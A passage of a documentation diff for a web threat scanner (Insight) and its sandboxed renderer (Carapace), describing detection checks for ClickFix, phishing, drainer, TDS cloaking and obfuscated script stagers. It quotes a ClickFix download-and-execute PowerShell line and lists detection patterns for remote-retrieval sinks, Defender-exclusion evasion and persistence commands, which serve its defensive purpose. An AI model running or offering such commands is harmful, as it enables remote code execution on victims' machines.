+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Shell command (PowerShell, mshta, cmd, iex) embedded in an HTML <code>data-*</code> attribute or event handler — ClickFix payload storage</td></tr>
+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Shell command embedded in a hidden HTML element (<code>display:none</code>, hidden input, <code>&lt;template&gt;</code>) — ClickFix payload storage</td></tr>
+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Wallet extension injection: <code>chrome-extension://</code> or <code>moz-extension://</code> hardcoded as a script <code>src</code> — drainer kits</td></tr>
             <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Phishing form: <code>action</code> domain &ne; page domain (no brand signal in title)</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>OTP / MFA relay form — the AiTM second phase (Tycoon2FA, Mamba2FA, Greatness, V3B)</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Copyright impersonation: a verbatim brand copyright footer on an unrelated domain — ClickFix trust-building</td></tr>
             <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Hidden iframe (<code>display:none</code>, <code>width=0</code>, <code>height=0</code>, off-screen position)</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td><code>&lt;base href&gt;</code> pointing to external domain (URL hijacking)</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Meta refresh redirect with delay &le; 2s to external domain</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td><code>&lt;base href&gt;</code> pointing to an external domain (URL hijacking)</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Meta refresh redirect with delay &le; 2s to an external domain</td></tr>
             <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Login form transmitting credentials over plain HTTP</td></tr>
             <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Fake browser update page: browser/update terminology + executable download link (SocGholish / ClearFake)</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Fake CAPTCHA / ClickFix: human-verification text + Win+R / terminal execution instructions (expanded: "click to fix", "browser verification", "run the following command" variants)</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Fake CAPTCHA / ClickFix: human-verification text + Win+R or terminal execution instructions</td></tr>
             <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Clickjacking overlay: full-viewport fixed/absolute element with z-index &gt; 100 + click handler</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>External script loaded from unknown domain that is also <code>dns-prefetch</code>-staged in the same page — deliberate WordPress compromise pattern (e.g. WPCode injection)</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Tampered GTM snippet: the GTM noscript iframe or init script points at a non-Google domain</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Encrypted script container: <code>&lt;script type="application/octet-stream"&gt;</code> payload storage — ChaCha20 ClickFix delivery</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Obfuscated CSS class names: &ge; 85% random 10-char alpha classes — a phishing-kit generator fingerprint</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>WebDAV infrastructure: PROPFIND multi-status response with C2 path patterns</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>External script from an unknown domain that is also <code>dns-prefetch</code>-staged in the same page — a deliberate WordPress compromise pattern (e.g. WPCode injection)</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>JavaScript execution gate — a content-less page that re-requests itself with a proof-of-JS token (see <a href="#solve">Gate Solving</a>)</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Client-side interstitial redirect — shortener and TDS doorway pattern</td></tr>
             <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td><code>&lt;base href&gt;</code> present — same origin, verify it is intentional</td></tr>
             <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Meta refresh redirect (any delay)</td></tr>
             <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Right-click disabled via <code>oncontextmenu="return false"</code></td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Suspicious executable download link (<code>.exe</code>, <code>.msi</code>, <code>.ps1</code>, <code>.bat</code>, <code>.hta</code>, etc.)</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Suspicious executable download link (<code>.exe</code>, <code>.msi</code>, <code>.ps1</code>, <code>.bat</code>, <code>.hta</code>, …)</td></tr>
             <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Inline script dominates page content (script &gt; 3&times; non-script HTML)</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td><code>&lt;noscript&gt;</code> block contains external URL redirect</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Sensitive keywords in HTML comments (password, api_key, token, secret, etc.)</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Resources loaded from IPFS gateways (takedown-resistant phishing / drainer hosting)</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>External script preloaded via <code>&lt;link rel="preload" as="script"&gt;</code> or <code>&lt;link rel="prefetch"&gt;</code> from unknown domain — WordPress malware injection staging pattern</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>External <code>&lt;script src&gt;</code> from unknown domain without dns-prefetch staging</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td><code>&lt;noscript&gt;</code> block contains an external URL redirect</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Sensitive keywords in HTML comments (password, api_key, token, secret, …)</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Resources loaded from IPFS gateways — takedown-resistant phishing and drainer hosting</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>External script preloaded via <code>&lt;link rel="preload" as="script"&gt;</code> or <code>&lt;link rel="prefetch"&gt;</code> from an unknown domain — WordPress malware injection staging</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>External <code>&lt;script src&gt;</code> from an unknown domain without dns-prefetch staging</td></tr>
             <tr><td><span style="color:#60a5fa;">LOW</span></td><td>External scripts loaded without Subresource Integrity (SRI)</td></tr>
-            <tr><td><span style="color:#60a5fa;">LOW</span></td><td>Password field missing <code>autocomplete</code> attribute</td></tr>
+            <tr><td><span style="color:#60a5fa;">LOW</span></td><td>Password field missing an <code>autocomplete</code> attribute</td></tr>
             <tr><td><span style="color:#60a5fa;">LOW</span></td><td>CSS <code>user-select: none</code> disabling text selection</td></tr>
           </tbody>
         </table>
       </div>
 
+      <!-- ── Script Payloads ── -->
+      <h2 id="script-payloads"><i class="bi bi-terminal-x me-2" style="color:var(--accent);"></i>Native Script Payloads</h2>
+      <p>
+        The JavaScript analyser reads JavaScript and the HTML analyser reads documents. Neither reads a response whose
+        <em>entire body</em> is a PowerShell, batch, POSIX-shell or VBScript program — which is exactly how a ClickFix
+        second stage is delivered: the lure tells the victim to paste <code>powershell -c "irm https://host/x | iex"</code>,
+        and <code>https://host/x</code> answers with a script, not a web page. Those responses are analysed as scripts.
+      </p>
+      <p>
+        Language is classified from content alone (<code>powershell</code>, <code>batch</code>, <code>shell</code>,
+        <code>vbscript</code>, <code>python</code>, <code>applescript</code>), declining anything that opens as an HTML
+        document or carries JavaScript tell-tales.
+      </p>
+      <div class="v-wrap mb-3">
+        <table class="v-table">
+          <thead><tr><th>Severity</th><th>Check</th><th>Fires when</th></tr></thead>
+          <tbody>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Download-and-execute chain</td><td>A remote-retrieval sink (<code>DownloadString</code>, <code>Net.WebClient</code>, <code>Invoke-WebRequest</code>/<code>RestMethod</code>, <code>iwr</code>/<code>irm</code>/<code>curl</code>/<code>wget</code>, <code>certutil -urlcache</code>, BITS) <em>and</em> an execution sink (<code>iex</code>, <code>| sh</code>, <code>Start-Process</code>)</td></tr>
+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>&#8627; obfuscated stager</td><td>The same chain, plus established concealment</td></tr>
+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>&#8627; ClickFix-marked</td><td>The same chain, plus the <code>&lt;# Verification code: … #&gt;</code> marker the lure tells the victim to expect</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Obfuscated payload body</td><td>Concealment established but no execution sink present</td></tr>
+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Defender evasion</td><td><code>Add-MpPreference … -ExclusionPath</code>/<code>-Extension</code>/<code>-Process</code> (Windows languages only)</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Persistence</td><td>Run key, <code>schtasks /create</code>, <code>New-</code>/<code>Register-ScheduledTask</code>, or a Startup-folder <code>.lnk</code>/<code>.vbs</code>/<code>.bat</code>/<code>.cmd</code>/<code>.ps1</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p style="color:var(--muted); font-size:.875rem;">
+        <strong style="color:var(--text);">Obfuscation tiering</strong> is what separates a stager from a published
+        one-line installer — rustup, Chocolatey and Homebrew all download and execute, in readable source.
+        <em>Strong</em> signals (any one establishes concealment): a per-character decode loop, <code>-bxor</code> /
+        <code>^ ord(</code>, <code>-enc &lt;base64&gt;</code> / <code>base64 -d</code>,
+        <code>[scriptblock]::Create($…)</code>. <em>Weak</em> signals need two: a long hex literal (usually a checksum),
+        <code>FromBase64String</code>, <code>[char]</code> reconstruction, <code>GzipStream</code>,
+        <code>ConvertTo-SecureString</code>. Evidence is labelled by section, and hex plus repeating-key XOR constants
+        are decoded inline.
+      </p>
+
       <!-- ── Domain Intelligence ── -->
       <h2 id="domain-intel"><i class="bi bi-globe2 me-2" style="color:var(--accent);"></i>Domain Intelligence</h2>
-      <p>Domain checks run against the hostname of the scanned URL. No WHOIS or DNS lookups are made — detection is based on the domain string itself.</p>
+      <p>
+        Domain checks run against the hostname of the scanned URL, and against every hop of the network trace — a
+        redirect chain that ends somewhere disposable is the signal, and checking only the submitted URL would miss it.
+        Most checks need nothing but the domain string; registration age comes from a WHOIS lookup.
+      </p>
       <div class="v-wrap mb-3">
         <table class="v-table">
           <thead><tr><th>Severity</th><th>Check</th></tr></thead>
           <tbody>
             <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Subdomain token is a typosquat of a known brand (Levenshtein edit distance 1)</td></tr>
-            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Subdomain contains exact brand keyword (e.g. <code>paypal.attacker.com</code>)</td></tr>
+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Subdomain contains an exact brand keyword (e.g. <code>paypal.attacker.com</code>)</td></tr>
             <tr><td><span style="color:#fb923c;">HIGH</span></td><td>SLD (registered domain) is a typosquat of a known brand (edit distance 1)</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>IDN / homograph attack — Cyrillic or mixed-script characters in domain</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Brand keyword in registered domain (e.g. <code>paypal-secure.com</code>) — attacker owns the SLD</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>High-risk TLD (<code>.xyz</code>, <code>.top</code>, <code>.click</code>, <code>.loan</code>, <code>.zip</code>, <code>.cyou</code>, and 20+ more) — strong context signal, not conclusive alone</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>DGA probability score &gt; 0.8 — strong algorithmic generation signal, characteristics consistent with C2 infrastructure</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>DGA probability score 0.6–0.8 (consonant ratio + entropy + English subword absence)</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Digit substitution in SLD (e.g. <code>g00gle</code>, <code>faceb00k</code>)</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>IDN / homograph attack — Cyrillic or mixed-script characters in the domain</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Brand keyword in the registered domain (e.g. <code>paypal-secure.com</code>) — the attacker owns the SLD</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>DGA probability score &gt; 0.8 — strong algorithmic-generation signal, consistent with C2 infrastructure</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>DGA probability score 0.6–0.8 — scikit-learn classifier (lazy-loaded) with a heuristic fallback: consonant ratio + entropy + absence of English subwords</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>High-risk TLD (<code>.xyz</code>, <code>.top</code>, <code>.click</code>, <code>.loan</code>, <code>.zip</code>, <code>.cyou</code>, and 20+ more) — a strong context signal, not conclusive alone</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Digit substitution in the SLD (e.g. <code>g00gle</code>, <code>faceb00k</code>)</td></tr>
             <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Excessive subdomain depth (&gt; 4 labels)</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Hosted on abuse-prone free platform with long random subdomain (Cloudflare R2, Pages.dev, Firebase)</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Hosted on an abuse-prone free platform with a long random subdomain (Cloudflare R2, Pages.dev, Firebase, Zapier, Render, Replit)</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Bare IP address as the host</td></tr>
             <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Newly registered domain (&le; 30 days old) — disproportionately present in threat feeds; requires WHOIS data</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Subdomain encodes a domain via dot-to-hyphen substitution (e.g. <code>support-paypal-com.zapier.app</code>) — phishing-as-a-service technique using free subdomain hosting; HIGH if hosted on an abuse-prone platform</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Delivery/postal brand keyword embedded in SLD (USPS, FedEx, DHL) without being the official site — fake parcel notification phishing</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Subdomain encodes a domain by dot-to-hyphen substitution (e.g. <code>support-netcoin-com.zapier.app</code> decodes to <code>support.netcoin.com</code>) — phishing-as-a-service on free subdomain hosting; HIGH on an abuse-prone platform</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Delivery / postal brand keyword in the SLD (USPS, FedEx, DHL) without being the official site — fake parcel notification phishing</td></tr>
             <tr><td><span style="color:#94a3b8;">INFO</span></td><td>Recently registered domain (31–90 days old) — context signal for analysts</td></tr>
           </tbody>
         </table>
       </div>
-      <p>Brands monitored include: PayPal, Google, Microsoft, Apple, Amazon, Facebook, Instagram, Netflix, Steam, Coinbase, Binance, MetaMask, Ledger, Trezor, Trust Wallet, OpenSea, Roblox, Discord, Twitch, Spotify, Chase, Barclays, and more.</p>
+      <p>Brands monitored include: PayPal, Google, Microsoft, Apple, Amazon, Facebook, Instagram, Netflix, Steam, Coinbase, Binance, MetaMask, Ledger, Trezor, Trust Wallet, OpenSea, Roblox, Discord, Twitch, Spotify, Chase, Barclays, Citi, and more. The registry is maintained against the false-positive corpus — a brand only enters it once promoting it does not start flagging the brand's own site.</p>
 
       <!-- ── Header Analysis ── -->
       <h2 id="header-analysis"><i class="bi bi-card-list me-2" style="color:var(--accent);"></i>Header Analysis</h2>
@@ -519,7 +656,7 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
             <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Hostname / SAN mismatch</td></tr>
             <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Let's Encrypt certificate issued to a brand-impersonating domain</td></tr>
             <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Deprecated TLS version (1.0 or 1.1) negotiated</td></tr>
-            <tr><td><span style="color:#94a3b8;">INFO</span></td><td>Certificate issued within the last 7 days — new cert on suspicious domain is a phishing indicator</td></tr>
+            <tr><td><span style="color:#94a3b8;">INFO</span></td><td>Certificate issued within the last 7 days — a new cert on a suspicious domain is a phishing indicator</td></tr>
           </tbody>
         </table>
       </div>
@@ -527,13 +664,15 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
       <!-- ── Tech Detection ── -->
       <h2 id="tech-detection"><i class="bi bi-layers me-2" style="color:var(--accent);"></i>Technology Detection</h2>
       <p>
-        Identifies the technology stack from HTML, script sources, HTTP headers, and cookies.
-        Displayed as colour-coded badges with logos on the results page.
+        Identifies the technology stack from HTML, script sources, HTTP headers, and cookies — merged with the
+        richer stack the renderer reads out of the live DOM. Displayed as colour-coded badges with logos on the
+        results page, and aggregated across all scans on the statistics page.
       </p>
       <div class="v-wrap mb-3">
         <table class="v-table">
           <thead><tr><th>Category</th><th>Technologies detected</th></tr></thead>
           <tbody>
+            <tr><td>Phishing Simulation</td><td>Cofense (PhishMe), KnowBe4, Proofpoint Security Awareness, Hoxhunt, Sophos Phish Threat, Barracuda PhishLine, IRONSCALES, GoPhish</td></tr>
             <tr><td>CMS</td><td>WordPress, Drupal, Joomla, Ghost, Shopify, Wix, Squarespace, Webflow, HubSpot CMS</td></tr>
             <tr><td>JS Framework</td><td>React, Next.js, Vue, Nuxt, Angular, Svelte, SvelteKit, Ember, Backbone.js, Astro, Remix, Gatsby, Solid.js</td></tr>
             <tr><td>Build Tool</td><td>Vite, webpack</td></tr>
@@ -549,82 +688,223 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
           </tbody>
         </table>
       </div>
+      <div class="callout">
+        <strong>Phishing simulation awareness.</strong> A detected awareness-training platform (recognised from stable
+        CDN domains, cookie names and response headers rather than ephemeral campaign domains) also emits an
+        <strong>INFO</strong> finding explaining that the page is a simulation and poses no real threat — so an analyst
+        triaging a reported "phish" is not chasing their own security team's exercise.
+      </div>
 
       <!-- ── Carapace ── -->
       <h2 id="carapace"><i class="bi bi-camera me-2" style="color:var(--accent);"></i>Visual Renderer (Carapace)</h2>
       <p>
-        <a href="https://github.com/DanDreadless/Carapace" target="_blank">Carapace</a> is an optional companion
-        service that provides a Chromium-headless visual screenshot of each scanned URL.
-        It renders the page with <strong>JavaScript fully enabled</strong> but
-        <strong>all network requests intercepted and blocked</strong> — allowing dynamic overlays (ClickFix,
-        SocGholish, ClearFake, drainers) to execute and render visibly in the screenshot, revealing the
-        actual attack UI. A verdict badge is composited onto every screenshot.
+        <a href="https://github.com/DanDreadless/Carapace" target="_blank">Carapace</a> is a separate Rust service that
+        Insight uses as its renderer. It loads the target in headless Chromium <strong>with JavaScript enabled</strong>,
+        so runtime-injected overlays — ClickFix fake CAPTCHAs, SocGholish and ClearFake update prompts, drainer modals —
+        actually render and can be detected. Because it executes attacker code, it is confined rather than trusted.
+      </p>
+      <p>What every scan gains from it:</p>
+      <ul>
+        <li><strong>Screenshots</strong> — a full-page desktop capture (and optionally a 375&times;844 mobile one), trimmed to real content height so payloads positioned below the fold are not cropped away, with a verdict badge composited on</li>
+        <li><strong>Renderer threat flags</strong> — from the rendered DOM and runtime behaviour, plus oxc AST-based static JS analysis: eval chains, obfuscation, exfiltration calls, sandbox-evasion probes, drive-by downloads</li>
+        <li><strong>JS-computed redirect destinations</strong> — captured over CDP, which static analysis cannot resolve</li>
+        <li><strong>An extended technology stack</strong> — read from the rendered DOM</li>
+        <li><strong>A risk score</strong> (0–100) summing flag weights for quick triage. A non-zero score with no reported findings means the renderer saw something below its own reporting threshold — a tuning signal, surfaced as a LOW finding only when a genuine residual gap remains.</li>
+      </ul>
+
+      <h3>Containment</h3>
+      <p>
+        Every browser connection goes through an <strong>SSRF-enforcing policy proxy</strong>. Same-origin content —
+        and a vetted CDN list — is fetched live, so the page renders as a visitor would see it. Cross-origin requests,
+        the C2 and exfiltration signal, are refused and recorded as evidence. Every resolved IP is checked, which also
+        defeats DNS rebinding. Routing every request through the proxy (rather than letting Chromium connect directly
+        for allowlisted hosts) is what makes that guarantee hold for all traffic, not most of it.
       </p>
       <p>
-        Carapace runs as a separate Docker service alongside the Insight backend. When
-        <code>CARAPACE_URL</code> is configured, every scan automatically calls the
-        <code>POST /render</code> endpoint and the screenshot is stored with the scan result.
-        If Carapace is unavailable the scan continues normally — it is entirely best-effort.
+        The container runs non-root with all capabilities dropped, a read-only root filesystem, bounded CPU / memory /
+        PIDs, a hard per-render watchdog, and a network that cannot reach the database or the cache.
       </p>
-      <p>In addition to the screenshot, Carapace returns a <strong>threat report</strong> with:</p>
-      <ul>
-        <li>A <strong>risk score</strong> (0–100) derived from renderer-level observations</li>
-        <li><strong>Threat flags</strong> — findings from the renderer converted directly into Insight findings under the <code>Renderer</code> category</li>
-        <li><strong>Technology detections</strong> — a DOM-parsed tech stack that is merged with Insight's own BeautifulSoup-based detections, catching things a static parser may miss</li>
-      </ul>
+      <p>
+        Insight calls <code>POST /render</code> for every scan when <code>CARAPACE_URL</code> is set, retrying on 429
+        while the render gate is saturated. If Carapace is unavailable the scan continues without it — the renderer
+        phase is best-effort, never a hard dependency.
+      </p>
       <div class="callout">
-        Carapace is open-source (MIT) and available at
+        Carapace is open-source (MIT) at
         <a href="https://github.com/DanDreadless/Carapace" target="_blank">github.com/DanDreadless/Carapace</a>.
         It is designed to be deployed as a sidecar alongside Insight — see the full
         <a href="carapace.html">Carapace documentation</a> for the pipeline, CLI, HTTP API, threat report, and
         setup instructions.
       </div>
 
+      <!-- ── Gate Solving ── -->
+      <h2 id="solve"><i class="bi bi-door-open me-2" style="color:var(--accent);"></i>Gate Solving (<code>/solve</code>)</h2>
+      <p>
+        Some pages show a scanner nothing until a real browser has passed a gate. Carapace's <code>/solve</code>
+        endpoint loads the page in the same confined browser, lets the gate play out, and returns
+        <strong>the document the server actually served</strong> plus the navigation chain the browser was sent down.
+      </p>
+      <p>
+        <strong>Cloudflare bot challenges</strong> that survive TLS-fingerprint impersonation are solved in the browser
+        and the real page is analysed (INFO "Cloudflare challenge cleared"). Clearance is cached inside Carapace per
+        host and reused; no clearance cookie ever leaves it, and because clearance is bound to the solving IP this is
+        not cookie replay.
+      </p>
+      <p>
+        <strong>JavaScript cloaking gates</strong> — a content-less page that re-requests itself with a proof-of-JS
+        token — are followed as a visitor would follow them:
+      </p>
+      <div class="v-wrap mb-3">
+        <table class="v-table">
+          <thead><tr><th>Outcome</th><th>What happens</th></tr></thead>
+          <tbody>
+            <tr><td>Same-site content behind the gate</td><td>The landing document — validated as 2xx, same registrable domain, SSRF-checked, and not itself a gate — <strong>replaces the gate</strong> as the page under analysis. INFO finding with the chain; normal verdict.</td></tr>
+            <tr><td>Off-site forward</td><td>The signature of a <strong>traffic-distribution system (TDS)</strong> doorway. <strong>HIGH</strong> "cloaking gate forwards visitors off-site through a TDS", evidence = every sampled visit's chain. Each destination is then followed and analysed, so a lure at the end can carry the verdict to MALICIOUS.</td></tr>
+            <tr><td>Not forwarded this time, but seen before</td><td>The chains are recalled from a per-domain observation memory (7 days) and the same HIGH finding is emitted, stating that it is an earlier observation and when.</td></tr>
+            <tr><td>Nothing followed, nothing remembered</td><td>MEDIUM gate finding, verdict UNKNOWN — the scanner did not see the content and does not claim to have.</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p style="color:var(--muted); font-size:.875rem;">
+        <strong style="color:var(--text);">Sampling versus burning.</strong> A TDS picks a destination per visitor, so
+        one visit is not a reliable sample — the gate is sampled more than once, within a fixed time budget. It is not
+        sampled more aggressively than that because a TDS <em>burns</em> an exit that keeps visiting: observed doorways
+        are remembered for a week instead, so a later scan the TDS refuses to forward is still reported with the date it
+        was seen. Because a doorway and where it sends people <em>are</em> the content, the verdict is not degraded to
+        UNKNOWN in that case.
+      </p>
+
       <h2 id="carapace-findings"><i class="bi bi-flag me-2" style="color:var(--accent);"></i>Renderer Findings</h2>
       <p>
-        Threat flags from Carapace are converted to Insight findings in the <code>Renderer</code> category.
-        Sanitisation-behaviour codes that fire on almost every real page (e.g.
-        <code>BLOCKED_ELEMENT_SCRIPT</code>, <code>NETWORK_ATTEMPT_BLOCKED</code>) are suppressed — only
-        signals with independent threat value are surfaced.
+        Threat flags from Carapace are mapped to Insight findings in the <code>Renderer</code> category. Codes that
+        fire on almost every real page are suppressed or aggregated into a single INFO "sanitisation activity" finding —
+        only signals with independent threat value are surfaced.
       </p>
       <div class="v-wrap mb-3">
         <table class="v-table">
           <thead><tr><th>Severity</th><th>Flag</th><th>Description</th></tr></thead>
           <tbody>
-            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Drive-by download blocked</td><td>Renderer intercepted an automatic file download — filename, MIME type, and SHA-256 recorded without executing the file</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>JS eval detected</td><td><code>eval()</code> or <code>new Function()</code> execution observed at render time — runtime obfuscation</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Exfiltration attempt blocked</td><td>Outbound XHR / fetch to an external domain intercepted by the network block</td></tr>
-            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Credential field on HTTP</td><td>Password input found on an unencrypted page — credentials would be sent in plaintext</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Redirect chain detected</td><td>Multiple HTTP redirects observed before final page load — common in traffic distribution systems</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Suspicious download link</td><td>Executable file linked from page content (<code>.exe</code>, <code>.msi</code>, <code>.ps1</code>, etc.)</td></tr>
-            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>DevTools evasion detected</td><td>Renderer-side debugger / devtools detection attempt observed</td></tr>
+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Drive-by download</td><td>A sub-resource answered with <code>Content-Disposition: attachment</code> or an executable MIME type. The body is never written to disk — filename, MIME type and SHA-256 only. Downgraded to LOW when the filename is plainly an image and the MIME type is merely mismatched.</td></tr>
+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>ClickFix clipboard hijack</td><td>Runtime interception of a clipboard write whose payload contains a shell-command indicator — a confirmed paste-and-run payload, captured as evidence</td></tr>
+            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Browser-in-the-Browser</td><td>A brand login URL (<code>login.microsoftonline.com</code>, <code>accounts.google.com</code>, <code>appleid.apple.com</code>, …) rendered as visible page text or an input value — a fake browser window drawn inside the page</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Clipboard hijack</td><td>Clipboard write intercepted at runtime, payload captured — no shell indicator</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Client-side decrypted page</td><td>WebCrypto decrypt + an AES-GCM literal + a DOM-HTML sink — "ghost code": the page assembles itself in the browser so the served source shows nothing</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>CSS overlay injected</td><td>Full-viewport fixed element with its own background — screen takeover. Cookie-consent banners are suppressed: they put the background on inner elements.</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Obfuscation / decode primitives</td><td>Base64 or hex obfuscation, timer-string execution, dangerous DOM sinks — observed at AST level by the oxc analyser, with decoded values in evidence</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>WebSocket attempt</td><td><code>new WebSocket(url)</code> — a real-time C2 channel attempt</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Sandbox evasion (gated)</td><td>A headless-detection probe — webdriver, <code>chrome.runtime</code>, focus, canvas/WebGL fingerprint, notification permission, <code>HeadlessChrome</code> strings — that <em>gates</em> content delivery. The same probe with nothing gated on it is LOW: that is ordinary anti-fraud SDK behaviour.</td></tr>
+            <tr><td><span style="color:#fb923c;">HIGH</span></td><td>Credential field on HTTP</td><td>A password input on an unencrypted page — credentials would travel in plaintext</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Runtime eval</td><td><code>eval()</code> / <code>new Function()</code> at render time. MEDIUM on its own; HIGH when the same render also produced an obfuscation or decode companion flag.</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>QR code to an external domain</td><td>QR codes decoded from the page's images and from the screenshot itself — catching canvas- and CSS-drawn codes — with URL payloads extracted. Quishing lure when paired with brand impersonation.</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Visitor IP fingerprinting</td><td>Runtime calls to geoIP / IP-echo services (ipapi.co, ipinfo.io, ipify.org, …) — the reconnaissance step before geofenced cloaking</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Requests to unknown external domains</td><td>Source-level references to external domains the proxy refused before JS executed. LOW when no concrete domain reaches the evidence.</td></tr>
+            <tr><td><span style="color:#fbbf24;">MEDIUM</span></td><td>Redirect / document.write</td><td>Runtime <code>location.href</code> assignment or <code>document.write()</code> — suppressed when the destination resolves to a known-good domain</td></tr>
+            <tr><td><span style="color:#60a5fa;">LOW</span></td><td>Intercepted cross-origin request</td><td>A cross-origin URL the page requested at render time that the policy proxy refused. The page's own domain and subdomains are filtered out first, so ordinary lazy-loading and REST calls do not appear.</td></tr>
+            <tr><td><span style="color:#94a3b8;">INFO</span></td><td>Sanitisation activity</td><td>Aggregate count of elements and attributes the renderer stripped — one finding rather than dozens</td></tr>
           </tbody>
         </table>
       </div>
 
       <!-- ── API Reference ── -->
       <h2 id="api-ref"><i class="bi bi-braces me-2" style="color:var(--accent);"></i>API Endpoints</h2>
-      <p>All endpoints are under <code>/api/</code>. No authentication is required — rate limiting is enforced per IP address.</p>
+      <p>
